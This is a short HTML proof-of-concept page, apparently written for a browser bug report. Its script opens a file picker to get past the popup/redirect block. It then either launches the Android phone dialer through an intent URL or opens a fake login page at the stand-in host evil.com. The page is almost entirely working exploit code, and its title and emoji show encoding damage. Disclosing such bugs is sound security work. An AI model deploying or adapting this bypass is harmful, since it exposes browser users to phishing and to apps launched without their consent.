<!DOCTYPE html>
<html>
<head>
<title>Popup/Redirect Bypass â€“ Dual Abuse PoC</title>
</head>
<body>
<h2>File Picker â†’ App Launch / Phishing</h2>
<p>Pick any file. Depending on the mode, it will either:</p>
<ul>
<li>ðŸ“± Launch the Phone Dialer</li>
<li>ðŸŽ­ Redirect to a fake login page (evil.com)</li>
</ul>

<select id="mode">
  <option value="dialer">ðŸ“± Launch Dialer</option>
  <option value="phish">ðŸŽ­ Fake Login Page</option>
</select>
<br><br>
<button onclick="trigger()">Pick File & Exploit</button>

<script>
async function trigger() {
    const mode = document.getElementById('mode').value;
    try {
        // Step 1: Trigger file picker (consumes popup/redirect block)
        await window.showOpenFilePicker();

        // Step 2: Payload switch
        if (mode === 'dialer') {
            // Cross-app abuse: Open phone dialer with number 12345
            window.open(
              'intent://12345#Intent;scheme=tel;package=com.android.server.telecom;end',
              '_blank'
            );
        } else if (mode === 'phish') {
            // Phishing: Redirect to fake login page
            window.open('https://evil.com/fake-login', '_blank');
        }
    } catch (e) {
        alert('Error: ' + e);
    }
}
</script>
</body>
</html>
